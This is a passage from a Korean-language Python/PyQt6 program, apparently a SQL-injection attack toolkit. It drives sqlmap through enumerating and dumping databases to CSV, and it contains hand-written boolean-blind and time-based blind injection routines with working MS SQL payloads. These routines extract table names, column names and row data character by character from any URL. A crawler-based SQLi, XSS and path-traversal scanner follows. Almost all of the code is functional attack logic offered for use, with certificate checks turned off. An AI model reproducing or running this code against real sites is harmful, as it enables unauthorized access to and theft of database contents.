            self.post_entry.setText(parts[1])
        else:
            self.rb_url.setChecked(True); self._on_mode_change()
            self.url_entry.setText(full)

    # ══════════════════════════════════════════════════════
    #  sqlmap 실행
    # ══════════════════════════════════════════════════════
    def _base_cmd(self):
        sqlmap = self.bin_entry.text().strip() or self.sqlmap_bin
        url    = self.url_entry.text().strip()
        if not url: QMessageBox.critical(self,"오류","URL 입력해줘"); return None
        cmd = [sqlmap]
        mode = self.mode_grp.checkedId()
        if mode == 2:
            cmd += ["-r", url]
        else:
            cmd += ["-u", url]
            data = self.post_entry.text().strip()
            if mode == 1 and data: cmd += ["--data", data]
        for flag, cb in self.opt_vars.items():
            if cb.isChecked(): cmd.append(flag)
        extra = self.extra_entry.text().strip()
        if extra: cmd += extra.split()
        return cmd

    def _run_dbs(self):
        cmd = self._base_cmd()
        if not cmd: return
        cmd.append("--dbs")
        self._execute(cmd, "STEP 1  DB 목록 추출", "dbs")

    def _run_tables(self):
        cmd = self._base_cmd()
        if not cmd: return
        db = self.db_entry.text().strip()
        if not db: QMessageBox.critical(self,"오류","DB 이름 입력해줘"); return
        cmd += ["-D", db, "--tables"]
        self._execute(cmd, f"STEP 2  테이블 목록  [{db}]", "tables")

    def _run_columns(self):
        cmd = self._base_cmd()
        if not cmd: return
        db  = self.db_entry.text().strip()
        tbl = self.tbl_entry.text().strip()
        if not db or not tbl: QMessageBox.critical(self,"오류","DB와 테이블 입력해줘"); return
        cmd += ["-D", db, "-T", tbl, "--columns"]
        self._execute(cmd, f"STEP 3  컬럼 목록  [{db}.{tbl}]", "cols")

    def _run_dump(self):
        cmd = self._base_cmd()
        if not cmd: return
        db  = self.db_entry.text().strip()
        tbl = self.tbl_entry.text().strip()
        if not db or not tbl: QMessageBox.critical(self,"오류","DB와 테이블 입력해줘"); return
        cmd += ["-D", db, "-T", tbl, "--dump"]
        # 선택된 컬럼 -C 옵션
        selected = [self.col_list.item(i).text()
                    for i in range(self.col_list.count())
                    if self.col_list.item(i).isSelected()]
        if selected:
            cmd += ["-C", ",".join(selected)]
            self._log(f"  선택된 컬럼: {', '.join(selected)}\n","found")
        self._execute(cmd, f"STEP 4  데이터 덤프  [{db}.{tbl}]", "dump")

    def _execute(self, cmd, label, parse=None):
        if self._thread and self._thread.isRunning():
            QMessageBox.warning(self,"실행 중","먼저 중지해줘"); return
        self._clear()
        self._log(f"{'━'*50}\n","dim")
        self._log(f"  {label}\n","step")
        self._log(f"{'━'*50}\n","dim")
        self._log(f"$ {' '.join(cmd)}\n\n","cmd")

        self._worker = Worker(cmd, parse)
        self._thread = QThread()
        self._worker.moveToThread(self._thread)
        self._thread.started.connect(self._worker.run)
        self._worker.log.connect(lambda t, g: self._log(t, g))
        self._worker.done.connect(self._on_done)
        self._worker.dbs.connect(self._on_dbs)
        self._worker.tables.connect(self._on_tables)
        self._worker.cols.connect(self._on_cols)
        self._worker.dump.connect(self._render_dump)
        self._worker.done.connect(lambda _: self._thread.quit())
        self._thread.start()

        self.stop_btn.setEnabled(True)
        self._set_status("● RUNNING", ACCENT2)

    def _on_dbs(self, dbs):
        if dbs:
            self.db_combo.clear()
            for d in dbs: self.db_combo.addItem(d)
            self._log(f"\n✓ DB 발견 ({len(dbs)}개): {', '.join(dbs)}\n","found")

    def _on_tables(self, tables):
        if tables:
            self.tbl_combo.clear()
            for t in tables: self.tbl_combo.addItem(t)
            self._log(f"\n✓ 테이블 발견 ({len(tables)}개)\n","found")

    def _on_cols(self, cols):
        if cols:
            self._log(f"\n✓ 컬럼 발견 ({len(cols)}개): {', '.join(cols)}\n","found")
            self.col_list.clear()
            for col in cols:
                item = QListWidgetItem(col)
                self.col_list.addItem(item)
            self.col_selected_lbl.setText(f"← {len(cols)}개 컬럼 발견 (클릭으로 선택)")

    def _render_dump(self, text):
        rows = []
        for line in text.splitlines():
            s = line.strip()
            if s.startswith("|") and s.endswith("|"):
                cells = [c.strip() for c in s[1:-1].split("|")]
                rows.append(cells)
        if not rows: return
        headers = rows[0]; data = rows[2:]
        if not headers: return
        self._dump_cols = headers; self._dump_rows = data
        self._data_tree.setColumnCount(len(headers))
        self._data_tree.setHeaderLabels(headers)
        self._data_tree.clear()
        for row in data:
            while len(row) < len(headers): row.append("")
            item = QTreeWidgetItem(row)
            self._data_tree.addTopLevelItem(item)
        self._row_count_lbl.setText(f"덤프 결과  {len(data)}행 × {len(headers)}컬럼")
        self.out_tab.setCurrentIndex(1)

    def _on_done(self, rc):
        self.stop_btn.setEnabled(False)
        now = datetime.now().strftime("%H:%M:%S")
        if rc == 0:
            self._log(f"\n[{now}] ✓ 완료\n","success")
            self._set_status("● DONE", ACCENT)
        elif rc == -1:
            self._log(f"\n[{now}] 실행 실패\n","error")
            self._set_status("● ERROR", RED)
        else:
            self._log(f"\n[{now}] 종료 (exit {rc})\n","warn")
            self._set_status("● STOPPED", YELLOW)

    def _stop(self):
        self._blind_stop = True
        if self._worker: self._worker.stop()

    def _save_csv(self):
        if not self._dump_cols: QMessageBox.information(self,"알림","데이터 없음"); return
        path, _ = QFileDialog.getSaveFileName(
            self,"CSV 저장",f"dump_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv",
            "CSV (*.csv);;All (*.*)")
        if path:
            import csv
            with open(path,"w",newline="",encoding="utf-8-sig") as f:
                w = csv.writer(f)
                w.writerow(self._dump_cols)
                w.writerows(self._dump_rows)

    # ══════════════════════════════════════════════════════
    #  Blind SQLi
    # ══════════════════════════════════════════════════════
    def _run_blind_table(self):
        url    = self.blind_url_entry.text().strip()
        maxlen = int(self.btbl_maxlen.text() or 20)
        idx    = int(self.btbl_idx.text() or 0)
        if not url: QMessageBox.critical(self,"오류","URL 입력해줘"); return
        self._blind_stop = False
        self.btbl_result.setText("결과: 추출 중...")
        self._log("\n"+"="*48+"\n","dim")
        self._log(f"  Blind 1  테이블명 추출  (index={idx})\n","step")
        self._log("="*48+"\n\n","dim")
        threading.Thread(
            target=self._blind_extract,
            args=(url,"sysobjects","name",f"xtype='U' ORDER BY name ASC",
                  maxlen,idx,self.btbl_progress,self.btbl_result),
            daemon=True).start()

    def _run_blind_col(self):
        url    = self.blind_url_entry.text().strip()
        table  = self.bcol_tbl.text().strip()
        maxlen = int(self.bcol_maxlen.text() or 20)
        idx    = int(self.bcol_idx.text() or 0)
        if not url or not table: QMessageBox.critical(self,"오류","URL과 테이블 입력해줘"); return
        self._blind_stop = False
        self.bcol_result.setText("결과: 추출 중...")
        self._log("\n"+"="*48+"\n","dim")
        self._log(f"  Blind 2  컬럼명 추출  [{table}]\n","step")
        self._log("="*48+"\n\n","dim")
        threading.Thread(
            target=self._blind_extract,
            args=(url,"syscolumns","name",
                  f"id=object_id('{table}') ORDER BY name ASC",
                  maxlen,idx,self.bcol_progress,self.bcol_result),
            daemon=True).start()

    def _blind_extract(self, url, sys_table, col, where, maxlen, row_idx, prog_lbl, res_lbl):
        import time
        parsed = urllib.parse.urlparse(url)
        qs     = urllib.parse.parse_qs(parsed.query)
        if not qs: self._log("[오류] URL 파라미터 없음\n","error"); return
        param    = list(qs.keys())[0]
        base_val = qs[param][0]
        session  = requests.Session()
        session.headers["User-Agent"] = "Mozilla/5.0"
        try:
            r_true = session.get(url.replace(f"{param}={base_val}",
                f"{param}={urllib.parse.quote(base_val+chr(39)+' AND 1=1--')}"),
                timeout=8, verify=False)
            true_len = len(r_true.text)
        except Exception as e:
            self._log(f"[오류] {e}\n","error"); return

        if row_idx == 0:
            subquery = f"SELECT TOP 1 {col} FROM {sys_table} WHERE {where}"
        else:
            subquery = (f"SELECT TOP 1 {col} FROM {sys_table} WHERE {where} "
                       f"AND {col} NOT IN (SELECT TOP {row_idx} {col} FROM {sys_table} WHERE {where})")
        result  = ""
        charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_$"
        for pos in range(1, maxlen+1):
            if self._blind_stop: break
            found_char = None
            for ch in charset:
                if self._blind_stop: break
                query = f"' AND '{ch}'=SUBSTRING(({subquery}),{pos},1)--"
                test_url = url.replace(f"{param}={base_val}",
                    f"{param}={urllib.parse.quote(base_val+query)}")
                try:
                    r = session.get(test_url, timeout=8, verify=False)
                    if abs(len(r.text)-true_len) < 50: found_char = ch; break
                except Exception: continue
                time.sleep(0.05)
            if found_char:
                result += found_char
                self._log(f"  [{pos:02d}] '{found_char}'  →  {result}\n","found")
                prog_lbl.setText(f"진행: {pos}/{maxlen}자")
                res_lbl.setText(f"결과: {result}")
            else: break
        final = result or "(추출 실패)"
        self._log(f"\n✓ 최종: {final}\n","success")
        res_lbl.setText(f"결과: {final}")

    def _run_boolean_blind(self):
        url    = self.blind_url_entry.text().strip()
        table  = self.blind_tbl_entry.text().strip()
        col    = self.blind_col_entry.text().strip()
        where  = self.blind_where_entry.text().strip()
        maxlen = int(self.blind_maxlen_entry.text() or 20)
        if not url or not table or not col:
            QMessageBox.critical(self,"오류","URL/테이블/컬럼 입력해줘"); return
        self._blind_stop = False
        self.bool_result_lbl.setText("결과: 추출 중...")
        self._log("\n"+"="*48+"\n","dim")
        self._log("  Blind 3  Boolean 데이터 추출\n","step")
        self._log("="*48+"\n\n","dim")
        threading.Thread(
            target=self._boolean_thread,
            args=(url,table,col,where,maxlen), daemon=True).start()

    def _boolean_thread(self, url, table, col, where, maxlen):
        import time
        parsed = urllib.parse.urlparse(url)
        qs     = urllib.parse.parse_qs(parsed.query)
        if not qs: self._log("[오류] URL 파라미터 없음\n","error"); return
        param    = list(qs.keys())[0]
        base_val = qs[param][0]
        where_clause = f"WHERE {where}" if where else ""
        session  = requests.Session()
        session.headers["User-Agent"] = "Mozilla/5.0"
        try:
            r_true = session.get(url.replace(f"{param}={base_val}",
                f"{param}={urllib.parse.quote(base_val+chr(39)+' AND 1=1--')}"),
                timeout=8, verify=False)
            true_len = len(r_true.text)
        except Exception as e:
            self._log(f"[오류] {e}\n","error"); return
        result  = ""
        charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@._!#$%"
        for pos in range(1, maxlen+1):
            if self._blind_stop: break
            found_char = None
            for ch in charset:
                if self._blind_stop: break
                query = (f"' AND '{ch}'=SUBSTRING("
                         f"(SELECT TOP 1 {col} FROM {table} {where_clause}),{pos},1)--")
                test_url = url.replace(f"{param}={base_val}",
                    f"{param}={urllib.parse.quote(base_val+query)}")
                try:
                    r = session.get(test_url, timeout=8, verify=False)
                    if abs(len(r.text)-true_len) < 50: found_char = ch; break
                except Exception: continue
                time.sleep(0.1)
            if found_char:
                result += found_char
                self._log(f"  [{pos:02d}] '{found_char}'  →  {result}\n","found")
                self.bool_progress_lbl.setText(f"진행: {pos}/{maxlen}자")
                self.bool_result_lbl.setText(f"결과: {result}")
            else: break
        final = result or "(추출 실패)"
        self._log(f"\n✓ 최종: {final}\n","success")
        self.bool_result_lbl.setText(f"결과: {final}")

    def _run_time_blind(self):
        url    = self.blind_url_entry.text().strip()
        table  = self.time_tbl_entry.text().strip()
        col    = self.time_col_entry.text().strip()
        where  = self.time_where_entry.text().strip()
        delay  = float(self.time_delay_entry.text() or 2)
        maxlen = int(self.time_maxlen_entry.text() or 20)
        if not url or not table or not col:
            QMessageBox.critical(self,"오류","URL/테이블/컬럼 입력해줘"); return
        self._blind_stop = False
        self.time_result_lbl.setText("결과: 추출 중...")
        self._log("\n"+"="*48+"\n","dim")
        self._log(f"  Blind 4  Time-based  (딜레이:{delay}초)\n","step")
        self._log("="*48+"\n\n","dim")
        threading.Thread(
            target=self._time_thread,
            args=(url,table,col,where,delay,maxlen), daemon=True).start()

    def _time_thread(self, url, table, col, where, delay, maxlen):
        import time
        parsed = urllib.parse.urlparse(url)
        qs     = urllib.parse.parse_qs(parsed.query)
        if not qs: self._log("[오류] URL 파라미터 없음\n","error"); return
        param    = list(qs.keys())[0]
        base_val = qs[param][0]
        where_clause = f"WHERE {where}" if where else ""
        session  = requests.Session()
        session.headers["User-Agent"] = "Mozilla/5.0"
        try:
            t0 = time.time()
            session.get(url, timeout=10, verify=False)
            self._log(f"  기준 응답시간: {time.time()-t0:.2f}초\n\n","dim")
        except Exception as e:
            self._log(f"[오류] {e}\n","error"); return
        result  = ""
        charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@._!#$%"
        for pos in range(1, maxlen+1):
            if self._blind_stop: break
            found_char = None
            for ch in charset:
                if self._blind_stop: break
                query = (f"'; IF ASCII(SUBSTRING((SELECT TOP 1 {col} FROM {table} {where_clause})"
                         f",{pos},1))={ord(ch)} WAITFOR DELAY '0:0:{int(delay)}'--")
                test_url = url.replace(f"{param}={base_val}",
                    f"{param}={urllib.parse.quote(base_val+query)}")
                try:
                    t0 = time.time()
                    session.get(test_url, timeout=delay+5, verify=False)
                    if time.time()-t0 >= delay: found_char = ch; break
                except Exception: continue
            if found_char:
                result += found_char
                self._log(f"  [{pos:02d}] '{found_char}'  →  {result}\n","found")
                self.time_progress_lbl.setText(f"진행: {pos}/{maxlen}자")
                self.time_result_lbl.setText(f"결과: {result}")
            else: break
        final = result or "(추출 실패)"
        self._log(f"\n✓ 최종: {final}\n","success")
        self.time_result_lbl.setText(f"결과: {final}")

    # ══════════════════════════════════════════════════════
    #  취약점 스캐너
    # ══════════════════════════════════════════════════════
    def _start_scan(self):
        if not HAS_REQUESTS:
            QMessageBox.critical(self,"오류","pip3 install requests beautifulsoup4"); return
        url = self.scan_url_entry.text().strip()
        if not url: QMessageBox.critical(self,"오류","URL 입력해줘"); return
        if not url.startswith("http"): url = "http://"+url
        self.scan_results = []
        self._scan_stop  = False
        self.scan_run_btn.setEnabled(False)
        self.scan_stop_btn.setEnabled(True)
        self._set_status("● SCANNING", ACCENT2)
        self.vuln_tree.clear()
        self.scan_log.clear()
        cookie = self.scan_cookie_entry.text().strip()
        threading.Thread(target=self._scan_thread, args=(url,cookie), daemon=True).start()

    def _stop_scan(self):
        self._scan_stop = True

    def _scan_thread(self, base_url, cookie):
        import time
        session = requests.Session()
        session.headers["User-Agent"] = "Mozilla/5.0"
        if cookie: session.headers["Cookie"] = cookie
        delay   = float(self.scan_delay_entry.text() or 0.3)
        timeout = int(self.scan_timeout_entry.text() or 5)

        self._slog("="*48+"\n","dim")
        self._slog(f"  🔍 스캔: {base_url}\n","step")
        self._slog("="*48+"\n\n","dim")
        self._slog("[ STEP 1 ] 크롤링...\n","step")

        forms, params = self._crawl(base_url, session, timeout)
        self._slog(f"  → 폼 {len(forms)}개 / 파라미터 {len(params)}개\n\n","success")

        if self.scan_vars["sqli"].isChecked():
            self._slog("[ STEP 2 ] SQLi 탐지...\n","step")
            for form in forms:
                for p in SQLI_PAYLOADS:
                    if self._scan_stop: break
                    self._test_sqli_form(form,p,session,timeout); time.sleep(delay)
            for up in params:
                for p in SQLI_PAYLOADS:
                    if self._scan_stop: break
                    self._test_sqli_param(up,p,session,timeout); time.sleep(delay)

        if self.scan_vars["xss"].isChecked() and not self._scan_stop:
            self._slog("\n[ STEP 3 ] XSS 탐지...\n","step")
            for form in forms:
                for p in XSS_PAYLOADS:
                    if self._scan_stop: break
                    self._test_xss_form(form,p,session,timeout); time.sleep(delay)
            for up in params:
                for p in XSS_PAYLOADS:
                    if self._scan_stop: break
                    self._test_xss_param(up,p,session,timeout); time.sleep(delay)

        if self.scan_vars["traversal"].isChecked() and not self._scan_stop:
            self._slog("\n[ STEP 4 ] Traversal 탐지...\n","step")
            for up in params:
                for p in TRAVERSAL_PAYLOADS:
                    if self._scan_stop: break
                    self._test_traversal(up,p,session,timeout); time.sleep(delay)

        if self.scan_vars["info"].isChecked() and not self._scan_stop:
            self._slog("\n[ STEP 5 ] 정보 노출...\n","step")
            for path in INFO_PATHS:
                if self._scan_stop: break
                self._test_info(base_url,path,session,timeout); time.sleep(delay)

        from PyQt6.QtCore import QMetaObject
        QMetaObject.invokeMethod(self, "_scan_done", Qt.ConnectionType.QueuedConnection)

    def _crawl(self, url, session, timeout):
        forms, params = [], []
        try:
            r = session.get(url, timeout=timeout, verify=False)
            soup = BeautifulSoup(r.text, "html.parser")
            for form in soup.find_all("form"):
                action = urllib.parse.urljoin(url, form.get("action",""))
                method = form.get("method","get").lower()
                inputs = {i.get("name"): i.get("value","test")
                          for i in form.find_all(["input","textarea"]) if i.get("name")}
                if inputs: forms.append({"url":action,"method":method,"inputs":inputs})
            parsed = urllib.parse.urlparse(url)
            for key in urllib.parse.parse_qs(parsed.query):
                params.append({"url":url,"param":key,"parsed":parsed})
            for a in soup.find_all("a", href=True):
                href = urllib.parse.urljoin(url, a["href"])
                p2   = urllib.parse.urlparse(href)
                for key in urllib.parse.parse_qs(p2.query):
                    if not any(x["url"]==href and x["param"]==key for x in params):
                        params.append({"url":href,"param":key,"parsed":p2})
        except Exception as e:
            self._slog(f"  [크롤링 오류] {e}\n","error")
        return forms, params

    def _test_sqli_form(self, form, payload, session, timeout):
        try:
            data = {k: payload for k in form["inputs"]}
            r = (session.post if form["method"]=="post" else session.get)(
                form["url"], **{"data" if form["method"]=="post" else "params": data},
                timeout=timeout, verify=False)
            self._check_sqli(r, form["url"], "form", payload)
        except Exception: pass

    def _test_sqli_param(self, up, payload, session, timeout):
        try:
            qs = urllib.parse.parse_qs(up["parsed"].query)
            qs[up["param"]] = [payload]
            new_url = up["parsed"]._replace(query=urllib.parse.urlencode(qs,doseq=True)).geturl()
            r = session.get(new_url, timeout=timeout, verify=False)
            self._check_sqli(r, new_url, up["param"], payload)
        except Exception: pass

    def _check_sqli(self, r, url, param, payload):
        body = r.text.lower()
        for err in SQLI_ERRORS:
            if err in body:
                self._add_vuln("SQLi", url, param, payload, "🔴 HIGH")
                self._slog(f"  [🚨 SQLi] {param} | '{err}'\n","error"); return

    def _test_xss_form(self, form, payload, session, timeout):
        try:
            data = {k: payload for k in form["inputs"]}
            r = (session.post if form["method"]=="post" else session.get)(
                form["url"], **{"data" if form["method"]=="post" else "params": data},
                timeout=timeout, verify=False)
            if payload in r.text:
                self._add_vuln("XSS", form["url"], "form", payload, "🟡 MEDIUM")
                self._slog("  [🚨 XSS] form 반사\n","warn")
        except Exception: pass

    def _test_xss_param(self, up, payload, session, timeout):
        try:
            qs = urllib.parse.parse_qs(up["parsed"].query)
            qs[up["param"]] = [payload]
            new_url = up["parsed"]._replace(query=urllib.parse.urlencode(qs,doseq=True)).geturl()
            r = session.get(new_url, timeout=timeout, verify=False)
            if payload in r.text:
                self._add_vuln("XSS", new_url, up["param"], payload, "🟡 MEDIUM")
                self._slog(f"  [🚨 XSS] {up['param']} 반사\n","warn")
        except Exception: pass

    def _test_traversal(self, up, payload, session, timeout):
        try:
            qs = urllib.parse.parse_qs(up["parsed"].query)
            qs[up["param"]] = [payload]
            new_url = up["parsed"]._replace(query=urllib.parse.urlencode(qs,doseq=True)).geturl()
            r = session.get(new_url, timeout=timeout, verify=False)
            for sign in TRAVERSAL_SIGNS:
                if sign in r.text:
                    self._add_vuln("Traversal", new_url, up["param"], payload, "🔴 HIGH")
                    self._slog(f"  [🚨 Traversal] {up['param']}\n","error"); return
        except Exception: pass

    def _test_info(self, base_url, path, session, timeout):
        try:
            url = base_url.rstrip("/")+path
            r = session.get(url, timeout=timeout, verify=False)
            if r.status_code == 200 and len(r.text) > 50:
                self._add_vuln("Info", url, path, "-", "🟠 LOW")
                self._slog(f"  [🚨 Info] {path}\n","warn")
        except Exception: pass

    def _add_vuln(self, vtype, url, param, payload, severity):
        r = {"type":vtype,"url":url,"param":param,"payload":payload,"severity":severity}
        self.scan_results.append(r)
        color = RED if "HIGH" in severity else (YELLOW if "MEDIUM" in severity else PURPLE)
        item = QTreeWidgetItem([vtype, url[:45], param, payload[:30], severity])
        item.setForeground(0, QColor(color))
        item.setForeground(4, QColor(color))
        from PyQt6.QtCore import QMetaObject, Q_ARG
        from PyQt6.QtCore import Qt as QtCore
        self.vuln_tree.addTopLevelItem(item)

    @pyqtSlot()
    def _scan_done(self):
        self.scan_run_btn.setEnabled(True)
        self.scan_stop_btn.setEnabled(False)
        total  = len(self.scan_results)
        high   = sum(1 for r in self.scan_results if "HIGH"   in r["severity"])
        medium = sum(1 for r in self.scan_results if "MEDIUM" in r["severity"])
        low    = sum(1 for r in self.scan_results if "LOW"    in r["severity"])
        self._slog(f"\n{'='*48}\n","dim")
        self._slog(f"  완료  |  총 {total}개\n","success" if not total else "error")
        self._slog(f"  HIGH:{high}  MEDIUM:{medium}  LOW:{low}\n","warn")
        self._set_status(f"● DONE  |  취약점 {total}개", ACCENT if not total else RED)
        self._gen_scan_report()
        if total: self.scan_tab.setCurrentIndex(1)

    def _gen_scan_report(self):
        self.scan_report.clear()
        now   = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        url   = self.scan_url_entry.text()
        total = len(self.scan_results)
        self.scan_report.append(f"{'='*50}\n  웹 취약점 진단 결과\n{'='*50}")
        self.scan_report.append(f"  대상  : {url}\n  일시  : {now}\n  총    : {total}개\n")
        for i,r in enumerate(self.scan_results,1):
            self.scan_report.append(
                f"  [{i}] {r['severity']}  {r['type']}\n"
                f"      URL      : {r['url']}\n"
                f"      파라미터 : {r['param']}\n"
                f"      페이로드 : {r['payload']}\n")

    def _save_scan_report(self):
        path, _ = QFileDialog.getSaveFileName(
            self,"리포트 저장",f"scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
            "Text (*.txt);;All (*.*)")
        if path:
            with open(path,"w",encoding="utf-8") as f:
                f.write(self.scan_report.toPlainText())


if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()
    app = QApplication(sys.argv)
    app.setStyleSheet(STYLE)
    win = SQLiToolkit()
    win.show()
    sys.exit(app.exec())
